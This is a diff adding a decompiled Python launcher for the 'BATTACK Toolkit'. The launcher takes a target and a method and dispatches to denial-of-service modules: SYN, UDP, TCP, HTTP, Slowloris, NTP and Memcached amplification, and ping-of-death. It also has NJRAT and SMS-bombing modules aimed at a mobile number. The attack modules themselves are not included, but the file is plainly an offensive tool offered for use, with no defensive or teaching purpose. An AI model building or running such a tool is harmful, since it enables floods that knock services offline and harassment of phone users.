@@ -1,0 +1,146 @@
+
+# Python Auto Dis Parser 2.0
+# Author : HTR-TECH | TAHMID RAYAT
+# https://linktr.ee/tahmid.rayat
+# https://fb.me/tahmid.rayat.official
+# ------------------------------------------
+# Embedded File   : botol
+# Python Bytecode : 2.7 (62211)
+# Decompiled at   : Mon Sep  7 12:15:28 2020
+# ------------------------------------------
+
+# coding=utf-8
+#!/usr/bin/env python3
+
+import os
+
+os.system("printf '\033]2;BATTACK Toolkit\a'")
+
+import argparse
+import sys
+import signal
+
+def signal_handler(signal, frame):
+    A = '\033[1;33m'
+    W = '\033[0m'
+    E = '\033[0m'
+    print(A+'\n[!]'+W+' Attack terminated.'+E)
+    os._exit(0)
+
+os.system("clear")
+print("")
+os.system("cat tools/addons/banner.txt")
+print("")
+print("")
+print("")
+
+def main():
+	parser = argparse.ArgumentParser()
+	parser.add_argument("--target", type = str, metavar = "",
+					help = "Type Mobile Number")
+	parser.add_argument("--tool", type = str, metavar = "",
+					help = "Select SMS")
+	parser.add_argument("--timeout", type = int, default = 10, metavar = "",
+					help = "Timeout in seconds.")
+	parser.add_argument("--threads", type = int, default = 3, metavar = "",
+					help = "Total Send.")
+	parser.add_argument("--update", action='store_true', dest="update", help = "Update BATTACK Toolkit.")
+	parser.add_argument("--version", action='store_true', dest="version", help = "Show BATTACK Toolkt version.")
+
+
+	# Get args
+	args = parser.parse_args()
+	threads = args.threads
+	time = args.timeout
+	method = str(args.tool).upper()
+	target = args.target
+
+	if method == "NTP":
+		signal.signal(signal.SIGINT, signal_handler)
+		import tools.addons.clean
+		import tools.addons.logo
+		from tools.other.ntp import NTP_ATTACK
+		NTP_ATTACK(threads, time, target)
+		
+	elif args.update:
+		os.system("chmod +x bin/battack && bin/battack -u")
+		sys.exit()
+
+	elif args.version:
+		print("")
+		os.system("cat tools/addons/banner.txt")
+		print("")
+		print("BATTACK Toolkit v2.0")
+		sys.exit()
+
+	elif method == "SYN":
+		signal.signal(signal.SIGINT, signal_handler)
+		import tools.addons.clean
+		import tools.addons.logo
+		from tools.other.syn import SYN_ATTACK
+		SYN_ATTACK(threads, time, target)
+
+	elif method == "TCP":
+		signal.signal(signal.SIGINT, signal_handler)
+		import tools.addons.clean
+		import tools.addons.logo
+		from tools.other.tcp import TCP_ATTACK
+		TCP_ATTACK(threads, time, target)
+
+	elif method == "POD":
+		signal.signal(signal.SIGINT, signal_handler)
+		import tools.addons.clean
+		import tools.addons.logo
+		from tools.other.pod import POD_ATTACK
+		POD_ATTACK(threads, time, target)
+
+	elif method == "NJRAT":
+		signal.signal(signal.SIGINT, signal_handler)
+		import tools.addons.clean
+		import tools.addons.logo
+		from tools.other.njrat import NJRAT_ATTACK
+		NJRAT_ATTACK(threads, time, target)
+
+	elif method == "UDP":
+		signal.signal(signal.SIGINT, signal_handler)
+		import tools.addons.clean
+		import tools.addons.logo
+		from tools.other.udp import UDP_ATTACK
+		UDP_ATTACK(threads, time, target)
+
+	elif method == "HTTP":
+		signal.signal(signal.SIGINT, signal_handler)
+		import tools.addons.clean
+		import tools.addons.logo
+		from tools.other.http import HTTP_ATTACK
+		HTTP_ATTACK(threads, time, target)
+
+	elif method == "SLOWLORIS":
+		signal.signal(signal.SIGINT, signal_handler)
+		import tools.addons.clean
+		import tools.addons.logo
+		from tools.other.slowloris import SLOWLORIS_ATTACK
+		SLOWLORIS_ATTACK(threads, time, target)
+	
+	elif method == "MEMCACHED":
+		signal.signal(signal.SIGINT, signal_handler)
+		import tools.addons.clean
+		import tools.addons.logo
+		from tools.other.memcached import MEMCACHED_ATTACK
+		MEMCACHED_ATTACK(threads, time, target)
+
+	elif method == "SMS":
+		signal.signal(signal.SIGINT, signal_handler)
+		import tools.addons.clean
+		import tools.addons.logo
+		from tools.SMS.main import SMS_ATTACK
+		SMS_ATTACK(threads, time, target)
+
+	else:
+		parser.print_help()
+
+if __name__ == '__main__':
+	main()
+
+
+# Okay Decompiling botol
